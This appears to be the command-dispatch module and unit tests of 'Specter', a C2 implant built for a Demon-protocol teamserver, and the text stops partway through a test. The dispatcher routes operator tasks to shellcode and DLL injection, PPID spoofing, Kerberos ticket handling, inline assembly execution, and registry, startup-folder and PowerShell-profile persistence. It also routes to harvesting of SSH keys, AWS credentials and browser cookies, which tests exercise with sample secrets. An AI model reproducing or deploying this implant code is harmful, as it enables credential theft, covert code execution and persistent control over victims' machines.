//! Command dispatch and handler implementations for the Specter agent.
//!
//! Routes incoming server task packages to platform-native handler functions and
//! assembles the response payloads consumed by the Rust teamserver.
//!
//! # Wire endianness
//!
//! * **Server → agent** (incoming task payload): integers are **little-endian**
//!   (`binary.LittleEndian` in the Go teamserver's `BuildPayloadMessage`).
//! * **Agent → server** (outgoing response payload — outer envelope)**:
//!   `command_id`, `request_id`, and the encrypted `payload_len` prefix are
//!   **big-endian** per the Demon wire protocol (consumed by `parse_callback_packages`).
//! * **Agent → server** (outgoing response payload — inner content)**:
//!   All callback payload *fields* (process entries, sleep values, FS paths, …)
//!   are **little-endian** so they are compatible with the Rust teamserver's
//!   `CallbackParser::read_u32` / `read_utf16` methods.  Only the FS download
//!   OPEN/chunk headers retain big-endian encoding to match the legacy Demon
//!   `PackageAdd*` wire format used by the download subsystem.

mod wire;
pub(crate) use wire::{
    decode_utf16le_null, parse_bytes_le, parse_u32_le, parse_u64_le, write_bytes_le, write_ptr_le,
    write_u32_be_always, write_u32_le, write_utf16le, write_wstring_be,
};
#[cfg(test)]
pub(crate) use wire::{write_ptr_be, write_utf16le_be};

mod assembly;
mod config;
mod filesystem;
mod harvest;
mod inject;
mod kerberos;
mod network;
mod persist;
mod process;
mod screenshot;
mod token;

use std::collections::HashMap;

use red_cell_common::demon::{DemonCallback, DemonCommand, DemonPackage};
use tracing::{info, warn};

use crate::coffeeldr::BofOutputQueue;
use crate::config::SpecterConfig;
use crate::download::DownloadTracker;
use crate::job::JobStore;
use crate::token::TokenVault;

/// In-memory PowerShell script store.  The teamserver sends script bytes via
/// `CommandPsImport`; the agent accumulates them for later execution.
pub type PsScriptStore = Vec<u8>;

// ─── In-memory file staging ─────────────────────────────────────────────────

/// A single in-memory file being staged by the teamserver via `CommandMemFile`
/// chunks.  Once all chunks have arrived (`is_complete()` returns true), the
/// accumulated data can be consumed by other commands such as `CommandFs/Upload`.
#[derive(Debug)]
pub struct MemFile {
    expected_size: usize,
    data: Vec<u8>,
}

impl MemFile {
    /// Append a chunk of data, truncating to `expected_size` if the total would
    /// exceed it.
    fn append(&mut self, chunk: &[u8]) {
        self.data.extend_from_slice(chunk);
        if self.data.len() > self.expected_size {
            self.data.truncate(self.expected_size);
        }
    }

    /// Returns `true` when the accumulated data equals the declared size.
    fn is_complete(&self) -> bool {
        self.data.len() == self.expected_size
    }
}

/// Collection of in-memory files keyed by their teamserver-assigned ID.
pub type MemFileStore = HashMap<u32, MemFile>;

// ─── Result type ─────────────────────────────────────────────────────────────

/// Outcome of dispatching one decoded task package.
#[derive(Debug)]
pub enum DispatchResult {
    /// Send one response packet to the server.
    Respond(Response),
    /// Send multiple response packets (e.g., proc-info + captured output).
    MultiRespond(Vec<Response>),
    /// Cleanly terminate the agent process.
    Exit,
    /// Nothing to send back (no-job, unrecognised command, parse error, …).
    Ignore,
}

/// A single pending agent → server response, ready to be wrapped in a callback
/// envelope and sent over the transport.
#[derive(Debug, Clone)]
pub struct Response {
    /// Demon command ID for the outgoing packet header.
    pub command_id: u32,
    /// Request ID to use for the callback.  When zero the agent loop falls back
    /// to the request ID from the originating task package.
    pub request_id: u32,
    /// Payload bytes already serialised in big-endian wire format.
    pub payload: Vec<u8>,
}

impl Response {
    fn new(cmd: DemonCommand, payload: Vec<u8>) -> Self {
        Self { command_id: cmd.into(), request_id: 0, payload }
    }
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

/// Build a [`BeaconOutput`] / [`DemonCallback::ErrorMessage`] response so the
/// operator receives an immediate error rather than waiting on a task that will
/// never complete.
///
/// Payload wire format (all LE): `[callback_type: u32][len: u32][text bytes]`
fn unimplemented_command_response(cmd: DemonCommand) -> DispatchResult {
    let text = format!("specter does not implement command {cmd:?} yet");
    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonCallback::ErrorMessage));
    write_bytes_le(&mut payload, text.as_bytes());
    DispatchResult::Respond(Response::new(DemonCommand::BeaconOutput, payload))
}

fn text_output_response(text: &str) -> DispatchResult {
    let mut payload = Vec::new();
    write_bytes_le(&mut payload, text.as_bytes());
    DispatchResult::Respond(Response::new(DemonCommand::CommandOutput, payload))
}

fn error_output_response(text: &str) -> DispatchResult {
    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonCallback::ErrorMessage));
    write_bytes_le(&mut payload, text.as_bytes());
    DispatchResult::Respond(Response::new(DemonCommand::BeaconOutput, payload))
}

// ─── Top-level dispatch ───────────────────────────────────────────────────────

/// Route a single decoded [`DemonPackage`] to the appropriate handler.
///
/// The [`DispatchResult`] must be transmitted back to the server using the
/// `request_id` from the original package.
pub fn dispatch(
    package: &DemonPackage,
    config: &mut SpecterConfig,
    token_vault: &mut TokenVault,
    downloads: &mut DownloadTracker,
    mem_files: &mut MemFileStore,
    job_store: &mut JobStore,
    ps_scripts: &mut PsScriptStore,
    bof_output_queue: &BofOutputQueue,
) -> DispatchResult {
    let cmd = match DemonCommand::try_from(package.command_id) {
        Ok(c) => c,
        Err(_) => {
            warn!(command_id = package.command_id, "received unknown command ID — ignoring");
            return DispatchResult::Ignore;
        }
    };

    info!(command = ?cmd, request_id = package.request_id, "dispatching command");

    match cmd {
        DemonCommand::CommandNoJob | DemonCommand::CommandGetJob => DispatchResult::Ignore,
        DemonCommand::CommandSleep => handle_sleep(&package.payload, config),
        DemonCommand::CommandFs => {
            filesystem::handle_fs(&package.payload, package.request_id, downloads, mem_files)
        }
        DemonCommand::CommandTransfer => filesystem::handle_transfer(&package.payload, downloads),
        DemonCommand::CommandProc => process::handle_proc(&package.payload),
        DemonCommand::CommandProcList => process::handle_proc_list(&package.payload),
        DemonCommand::CommandNet => network::handle_net(&package.payload),
        DemonCommand::CommandToken => token::handle_token(&package.payload, token_vault),
        DemonCommand::CommandMemFile => {
            filesystem::handle_memfile(&package.payload, package.request_id, mem_files)
        }
        DemonCommand::CommandInjectShellcode => inject::handle_inject_shellcode(&package.payload),
        DemonCommand::CommandInjectDll => inject::handle_inject_dll(&package.payload),
        DemonCommand::CommandSpawnDll => inject::handle_spawn_dll(&package.payload),
        DemonCommand::CommandProcPpidSpoof => {
            inject::handle_proc_ppid_spoof(&package.payload, config)
        }
        DemonCommand::CommandKerberos => kerberos::handle_kerberos(&package.payload),
        DemonCommand::CommandConfig => config::handle_config(&package.payload, config),
        DemonCommand::CommandInlineExecute => assembly::handle_inline_execute(
            &package.payload,
            package.request_id,
            config,
            mem_files,
            job_store,
            bof_output_queue,
        ),
        DemonCommand::CommandJob => assembly::handle_job(&package.payload, job_store),
        DemonCommand::CommandPsImport => {
            assembly::handle_ps_import(&package.payload, ps_scripts, mem_files)
        }
        DemonCommand::CommandAssemblyInlineExecute => {
            assembly::handle_assembly_inline_execute(&package.payload, mem_files)
        }
        DemonCommand::CommandAssemblyListVersions => assembly::handle_assembly_list_versions(),
        DemonCommand::CommandHarvest => harvest::handle_harvest(),
        DemonCommand::CommandScreenshot => screenshot::handle_screenshot(),
        DemonCommand::CommandPackageDropped => filesystem::handle_package_dropped(
            &package.payload,
            package.request_id,
            downloads,
            mem_files,
        ),
        DemonCommand::CommandPersist => persist::handle_persist(&package.payload),
        DemonCommand::CommandExit => DispatchResult::Exit,
        // CommandPivot is intercepted by the agent run-loop (agent.rs) *before*
        // dispatch() is called, so it is routed to PivotState::handle_command()
        // directly.  If it somehow reaches dispatch(), treat it as a no-op.
        DemonCommand::CommandPivot => DispatchResult::Ignore,
        // These are agent-to-server callbacks; ignore if received from server.
        DemonCommand::CommandOutput | DemonCommand::BeaconOutput => DispatchResult::Ignore,
        _ => {
            info!(command = ?cmd, "unhandled command — returning error to operator");
            unimplemented_command_response(cmd)
        }
    }
}

// ─── COMMAND_SLEEP (11) ──────────────────────────────────────────────────────

/// Handle a `CommandSleep` task: update the sleep configuration and echo it back.
///
/// Incoming payload (LE): `[delay_ms: u32][jitter_pct: u32]`
/// Outgoing payload (LE): `[delay_ms: u32][jitter_pct: u32]`
fn handle_sleep(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
    let mut offset = 0;

    let delay = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandSleep: failed to parse delay: {e}");
            return DispatchResult::Ignore;
        }
    };
    let jitter = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandSleep: failed to parse jitter: {e}");
            return DispatchResult::Ignore;
        }
    };

    info!(delay_ms = delay, jitter_pct = jitter, "sleep interval updated");
    config.sleep_delay_ms = delay;
    config.sleep_jitter = jitter.min(100);

    let mut out = Vec::with_capacity(8);
    write_u32_le(&mut out, delay);
    write_u32_le(&mut out, jitter);
    DispatchResult::Respond(Response::new(DemonCommand::CommandSleep, out))
}

// ─── Unit tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::download::{DOWNLOAD_MODE_OPEN, DOWNLOAD_REASON_REMOVED, DownloadState};
    use red_cell_common::demon::{
        DemonConfigKey, DemonInjectError, DemonInjectWay, DemonNetCommand, PhantomPersistOp,
    };

    use std::path::PathBuf;

    use crate::coffeeldr;
    use crate::dotnet;
    use red_cell_common::demon::{
        DemonFilesystemCommand, DemonPackage, DemonProcessCommand, DemonTokenCommand,
    };

    use super::assembly::{
        handle_assembly_inline_execute, handle_assembly_list_versions, handle_inline_execute,
        handle_job, handle_ps_import,
    };
    use super::config::handle_config;
    use super::filesystem::{
        handle_fs_download, handle_fs_upload, handle_memfile, handle_transfer, unix_secs_to_ymd_hm,
    };
    use super::harvest::{
        HarvestEntry, HarvestRoots, collect_credentials_for_roots, harvest_dispatch_result,
    };
    use super::inject::{
        handle_inject_dll, handle_inject_shellcode, handle_proc_ppid_spoof, handle_spawn_dll,
        inject_status_response,
    };
    use super::kerberos::{
        handle_kerberos, handle_kerberos_klist, handle_kerberos_luid, handle_kerberos_ptt,
        handle_kerberos_purge,
    };
    use super::persist::{
        SPECTER_PERSIST_MARKER, SPECTER_RUN_VALUE_NAME, SPECTER_STARTUP_FILE_NAME,
        TestPersistGuard, write_text_file,
    };
    use super::process::{arch_from_wow64, translate_to_shell_cmd};
    use super::screenshot::handle_screenshot;

    // ── Helpers ──────────────────────────────────────────────────────────────

    /// Build a LE-encoded u32 + u32 payload (used for CommandSleep tests).
    fn le_u32_pair(a: u32, b: u32) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&a.to_le_bytes());
        v.extend_from_slice(&b.to_le_bytes());
        v
    }

    /// Build a LE-encoded payload with a single u32 subcommand (for CommandFs/Proc).
    fn le_subcmd(subcmd: u32) -> Vec<u8> {
        subcmd.to_le_bytes().to_vec()
    }

    /// Build a LE length-prefixed UTF-16LE byte payload for a string.
    fn le_utf16le_payload(s: &str) -> Vec<u8> {
        let utf16: Vec<u8> =
            s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
        let mut v = Vec::new();
        v.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
        v.extend_from_slice(&utf16);
        v
    }

    /// Build a full Dir request payload (LE-encoded, matching the teamserver write order).
    #[allow(clippy::too_many_arguments)]
    fn dir_request_payload(
        path: &str,
        subdirs: bool,
        files_only: bool,
        dirs_only: bool,
        list_only: bool,
        starts: &str,
        contains: &str,
        ends: &str,
    ) -> Vec<u8> {
        let mut v = le_subcmd(1); // Dir = 1
        v.extend_from_slice(&0u32.to_le_bytes()); // file_explorer = false
        v.extend_from_slice(&le_utf16le_payload(path));
        v.extend_from_slice(&(subdirs as u32).to_le_bytes());
        v.extend_from_slice(&(files_only as u32).to_le_bytes());
        v.extend_from_slice(&(dirs_only as u32).to_le_bytes());
        v.extend_from_slice(&(list_only as u32).to_le_bytes());
        v.extend_from_slice(&le_utf16le_payload(starts));
        v.extend_from_slice(&le_utf16le_payload(contains));
        v.extend_from_slice(&le_utf16le_payload(ends));
        v
    }

    fn persist_payload(method: u32, op: u32, command: &str) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&method.to_le_bytes());
        payload.extend_from_slice(&op.to_le_bytes());
        if op == u32::from(PhantomPersistOp::Install) {
            payload.extend_from_slice(&(command.len() as u32).to_le_bytes());
            payload.extend_from_slice(command.as_bytes());
        }
        payload
    }

    fn decode_command_output_text(payload: &[u8]) -> String {
        let len = u32::from_le_bytes(payload[0..4].try_into().expect("u32 length")) as usize;
        String::from_utf8(payload[4..4 + len].to_vec()).expect("utf8 payload")
    }

    fn decode_error_text(payload: &[u8]) -> String {
        let callback_type = u32::from_le_bytes(payload[0..4].try_into().expect("callback type"));
        assert_eq!(callback_type, u32::from(DemonCallback::ErrorMessage));
        let len = u32::from_le_bytes(payload[4..8].try_into().expect("u32 length")) as usize;
        String::from_utf8(payload[8..8 + len].to_vec()).expect("utf8 payload")
    }

    fn harvest_expected_payload(entries: &[(&str, &str, &[u8])]) -> Vec<u8> {
        let mut buf = Vec::new();
        buf.extend_from_slice(&(entries.len() as u32).to_le_bytes());
        for (kind, path, data) in entries {
            buf.extend_from_slice(&(kind.len() as u32).to_le_bytes());
            buf.extend_from_slice(kind.as_bytes());
            buf.extend_from_slice(&(path.len() as u32).to_le_bytes());
            buf.extend_from_slice(path.as_bytes());
            buf.extend_from_slice(&(data.len() as u32).to_le_bytes());
            buf.extend_from_slice(data);
        }
        buf
    }

    fn make_test_persist_dir(prefix: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("{prefix}_{}", rand::random::<u32>()));
        std::fs::create_dir_all(&dir).expect("create temp persist dir");
        dir
    }

    // ── parse_u32_le ─────────────────────────────────────────────────────────

    #[test]
    fn parse_u32_le_reads_correct_value() {
        let buf = [0x01, 0x00, 0x00, 0x00]; // 1 in LE
        let mut offset = 0;
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("parse"), 1);
        assert_eq!(offset, 4);
    }

    #[test]
    fn parse_u32_le_advances_offset() {
        let buf = [0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00];
        let mut offset = 0;
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("first"), 1);
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("second"), 2);
    }

    #[test]
    fn parse_u32_le_short_buffer_returns_err() {
        let buf = [0x01, 0x00, 0x00]; // only 3 bytes
        let mut offset = 0;
        assert!(parse_u32_le(&buf, &mut offset).is_err());
    }

    // ── CommandHarvest ───────────────────────────────────────────────────────

    #[test]
    fn command_harvest_returns_structured_callback_for_collected_entries() {
        let result = harvest_dispatch_result(vec![
            HarvestEntry {
                kind: "ssh_key".to_owned(),
                path: "C:\\Users\\operator\\.ssh\\id_ed25519".to_owned(),
                data: b"-----BEGIN OPENSSH PRIVATE KEY-----\nsecret\n".to_vec(),
            },
            HarvestEntry {
                kind: "credentials".to_owned(),
                path: "C:\\Users\\operator\\.aws\\credentials".to_owned(),
                data: b"[default]\naws_access_key_id=AKIA...\n".to_vec(),
            },
        ]);

        let DispatchResult::Respond(response) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(response.command_id, u32::from(DemonCommand::CommandHarvest));
        assert_eq!(
            response.payload,
            harvest_expected_payload(&[
                (
                    "ssh_key",
                    "C:\\Users\\operator\\.ssh\\id_ed25519",
                    b"-----BEGIN OPENSSH PRIVATE KEY-----\nsecret\n",
                ),
                (
                    "credentials",
                    "C:\\Users\\operator\\.aws\\credentials",
                    b"[default]\naws_access_key_id=AKIA...\n",
                ),
            ])
        );
    }

    #[test]
    fn command_harvest_empty_result_encodes_zero_entries() {
        let result = harvest_dispatch_result(Vec::new());

        let DispatchResult::Respond(response) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(response.command_id, u32::from(DemonCommand::CommandHarvest));
        assert_eq!(response.payload, [0u8, 0, 0, 0]);
    }

    #[test]
    fn collect_credentials_for_roots_skips_empty_files() {
        let base = make_test_persist_dir("specter_harvest_empty");
        let user_profile = base.join("user");
        let app_data = base.join("appdata");
        let local_app_data = base.join("localappdata");

        std::fs::create_dir_all(user_profile.join(".ssh")).expect("create ssh dir");
        std::fs::create_dir_all(user_profile.join(".aws")).expect("create aws dir");
        std::fs::create_dir_all(local_app_data.join("Google/Chrome/User Data/Default/Network"))
            .expect("create chrome dir");
        std::fs::create_dir_all(app_data.join("Mozilla/Firefox/Profiles/profile.default"))
            .expect("create firefox dir");
        std::fs::write(user_profile.join(".ssh/id_ed25519.pub"), b"ssh-ed25519 AAAA")
            .expect("write public key");
        std::fs::write(local_app_data.join("Google/Chrome/User Data/Default/Network/Cookies"), b"")
            .expect("write empty cookie db");
        std::fs::write(
            app_data.join("Mozilla/Firefox/Profiles/profile.default/cookies.sqlite"),
            b"",
        )
        .expect("write empty firefox db");
        std::fs::write(user_profile.join(".aws/credentials"), b"").expect("write empty creds");

        let roots = HarvestRoots {
            user_profile: user_profile.clone(),
            app_data: Some(app_data.clone()),
            local_app_data: Some(local_app_data.clone()),
        };

        let entries = collect_credentials_for_roots(&roots);
        assert!(entries.is_empty(), "unexpected entries: {entries:?}");

        let _ = std::fs::remove_dir_all(base);
    }

    // ── CommandPersist ───────────────────────────────────────────────────────

    #[test]
    fn command_persist_registry_install_routes_to_command_output() {
        let persist_dir = make_test_persist_dir("specter_persist_registry");
        let _guard = TestPersistGuard::install(&persist_dir);

        let mut config = SpecterConfig::default();
        let payload = persist_payload(1, u32::from(PhantomPersistOp::Install), "cmd.exe /c whoami");
        let package = DemonPackage::new(DemonCommand::CommandPersist, 77, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));
        let text = decode_command_output_text(&resp.payload);
        assert!(text.contains("registry run key persistence installed"), "unexpected text: {text}");

        let persisted =
            std::fs::read_to_string(persist_dir.join("registry").join(SPECTER_RUN_VALUE_NAME))
                .expect("read persisted registry stub");
        assert_eq!(persisted, "cmd.exe /c whoami");
        let _ = std::fs::remove_dir_all(&persist_dir);
    }

    #[test]
    fn command_persist_startup_remove_deletes_script_and_reports_success() {
        let persist_dir = make_test_persist_dir("specter_persist_startup");
        let _guard = TestPersistGuard::install(&persist_dir);
        let startup_path = persist_dir.join("startup").join(SPECTER_STARTUP_FILE_NAME);
        write_text_file(&startup_path, "@echo off\r\ncalc.exe\r\n").expect("seed startup script");

        let mut config = SpecterConfig::default();
        let payload = persist_payload(2, u32::from(PhantomPersistOp::Remove), "");
        let package = DemonPackage::new(DemonCommand::CommandPersist, 78, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));
        let text = decode_command_output_text(&resp.payload);
        assert!(text.contains("startup folder persistence removed"), "unexpected text: {text}");
        assert!(!startup_path.exists(), "startup script should be removed");
        let _ = std::fs::remove_dir_all(&persist_dir);
    }

    #[test]
    fn command_persist_powershell_profile_install_is_idempotent() {
        let persist_dir = make_test_persist_dir("specter_persist_psprofile");
        let _guard = TestPersistGuard::install(&persist_dir);

        let mut config = SpecterConfig::default();
        let payload =
            persist_payload(3, u32::from(PhantomPersistOp::Install), "Start-Process notepad.exe");
        let package = DemonPackage::new(DemonCommand::CommandPersist, 79, payload.clone());

        let first = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = first else {
            panic!("expected Respond, got {first:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));

        let second_package = DemonPackage::new(DemonCommand::CommandPersist, 80, payload);
        let second = dispatch(
            &second_package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = second else {
            panic!("expected Respond, got {second:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));
        let text = decode_command_output_text(&resp.payload);
        assert!(text.contains("already present"), "unexpected text: {text}");

        let profile_path = persist_dir.join("powershell").join("Microsoft.PowerShell_profile.ps1");
        let profile = std::fs::read_to_string(&profile_path).expect("read powershell profile");
        assert_eq!(
            profile.matches(SPECTER_PERSIST_MARKER).count(),
            2,
            "profile should contain exactly one BEGIN/END marker pair"
        );
        let _ = std::fs::remove_dir_all(&persist_dir);
    }

    #[test]
    fn command_persist_powershell_profile_install_updates_changed_command() {
        let persist_dir = make_test_persist_dir("specter_persist_psprofile_update");
        let _guard = TestPersistGuard::install(&persist_dir);

        let mut config = SpecterConfig::default();

        // First install: command A.
        let payload_a =
            persist_payload(3, u32::from(PhantomPersistOp::Install), "Start-Process notepad.exe");
        let pkg_a = DemonPackage::new(DemonCommand::CommandPersist, 82, payload_a);
        let first = dispatch(
            &pkg_a,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = first else {
            panic!("expected Respond, got {first:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));

        // Second install: command B (different).
        let payload_b =
            persist_payload(3, u32::from(PhantomPersistOp::Install), "Start-Process calc.exe");
        let pkg_b = DemonPackage::new(DemonCommand::CommandPersist, 83, payload_b);
        let second = dispatch(
            &pkg_b,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = second else {
            panic!("expected Respond, got {second:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));
        let text = decode_command_output_text(&resp.payload);
        assert!(text.contains("updated"), "expected 'updated' in response, got: {text}");

        // Profile should still have exactly one marker pair.
        let profile_path = persist_dir.join("powershell").join("Microsoft.PowerShell_profile.ps1");
        let profile = std::fs::read_to_string(&profile_path).expect("read powershell profile");
        assert_eq!(
            profile.matches(SPECTER_PERSIST_MARKER).count(),
            2,
            "profile should contain exactly one BEGIN/END marker pair after update"
        );
        // New command must be present; old command must not.
        assert!(profile.contains("Start-Process calc.exe"), "new command not found in profile");
        assert!(
            !profile.contains("Start-Process notepad.exe"),
            "old command still present in profile after update"
        );

        let _ = std::fs::remove_dir_all(&persist_dir);
    }

    #[test]
    fn command_persist_unknown_method_returns_error_callback() {
        let mut config = SpecterConfig::default();
        let payload =
            persist_payload(99, u32::from(PhantomPersistOp::Install), "cmd.exe /c exit 0");
        let package = DemonPackage::new(DemonCommand::CommandPersist, 81, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::BeaconOutput));
        let text = decode_error_text(&resp.payload);
        assert!(text.contains("unknown Specter persist method 99"), "unexpected text: {text}");
    }

    // ── parse_bytes_le ───────────────────────────────────────────────────────

    #[test]
    fn parse_bytes_le_reads_length_prefixed_slice() {
        let data: &[u8] = &[0xAA, 0xBB];
        let mut buf = (data.len() as u32).to_le_bytes().to_vec();
        buf.extend_from_slice(data);
        let mut offset = 0;
        let result = parse_bytes_le(&buf, &mut offset).expect("parse");
        assert_eq!(result, data);
        assert_eq!(offset, 6);
    }

    #[test]
    fn parse_bytes_le_empty_payload_is_ok() {
        let buf = 0u32.to_le_bytes();
        let mut offset = 0;
        let result = parse_bytes_le(&buf, &mut offset).expect("parse");
        assert!(result.is_empty());
    }

    // ── decode_utf16le_null ──────────────────────────────────────────────────

    #[test]
    fn decode_utf16le_null_strips_null_terminator() {
        // "Hi\0" encoded as UTF-16LE
        let encoded: Vec<u8> = "Hi\0".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert_eq!(decode_utf16le_null(&encoded), "Hi");
    }

    #[test]
    fn decode_utf16le_null_handles_empty_slice() {
        assert_eq!(decode_utf16le_null(&[]), "");
    }

    // ── write_utf16le_be ─────────────────────────────────────────────────────

    #[test]
    fn write_utf16le_be_roundtrips_ascii_string() {
        let s = "hello";
        let mut buf = Vec::new();
        write_utf16le_be(&mut buf, s);

        // First 4 bytes: BE length of UTF-16LE bytes (including null terminator)
        // "hello\0" → 6 UTF-16 code units × 2 bytes = 12 bytes
        let len = u32::from_be_bytes(buf[0..4].try_into().expect("len"));
        assert_eq!(len, 12); // 5 chars + NUL = 6 × 2

        let decoded = decode_utf16le_null(&buf[4..]);
        assert_eq!(decoded, s);
    }

    // ── write_utf16le ────────────────────────────────────────────────────────

    #[test]
    fn write_utf16le_roundtrips_ascii_string() {
        let s = "hello";
        let mut buf = Vec::new();
        write_utf16le(&mut buf, s);

        // First 4 bytes: LE length of UTF-16LE bytes (including null terminator)
        // "hello\0" → 6 UTF-16 code units × 2 bytes = 12 bytes
        let len = u32::from_le_bytes(buf[0..4].try_into().expect("len"));
        assert_eq!(len, 12); // 5 chars + NUL = 6 × 2

        let decoded = decode_utf16le_null(&buf[4..]);
        assert_eq!(decoded, s);
    }

    // ── handle_sleep ─────────────────────────────────────────────────────────

    #[test]
    fn handle_sleep_updates_config_and_echoes_values() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(3000, 25);
        let package = DemonPackage::new(DemonCommand::CommandSleep, 42, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );

        assert_eq!(config.sleep_delay_ms, 3000);
        assert_eq!(config.sleep_jitter, 25);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandSleep));
        // Payload: [3000 LE][25 LE]
        let expected_delay = 3000u32.to_le_bytes();
        let expected_jitter = 25u32.to_le_bytes();
        assert_eq!(&resp.payload[0..4], &expected_delay);
        assert_eq!(&resp.payload[4..8], &expected_jitter);
    }

    #[test]
    fn handle_sleep_clamps_jitter_to_100() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(1000, 150); // jitter > 100
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
        dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert_eq!(config.sleep_jitter, 100);
    }

    #[test]
    fn handle_sleep_short_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, vec![0x01]); // too short
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_fs pwd ────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_pwd_returns_non_empty_path() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(9); // GetPwd = 9
        let package = DemonPackage::new(DemonCommand::CommandFs, 7, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));

        // First 4 bytes LE = subcommand (9)
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 9);

        // Remaining = length-prefixed UTF-16LE path
        assert!(resp.payload.len() > 8, "payload should contain a path");
    }

    // ── handle_fs cd ─────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_cd_changes_directory_and_echoes_path() {
        let tmp = std::env::temp_dir();
        let tmp_str = tmp.display().to_string();

        let mut config = SpecterConfig::default();
        let mut payload = le_subcmd(4); // Cd = 4
        payload.extend_from_slice(&le_utf16le_payload(&tmp_str));
        let package = DemonPackage::new(DemonCommand::CommandFs, 8, payload);

        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 4);

        // Decode echoed path from response
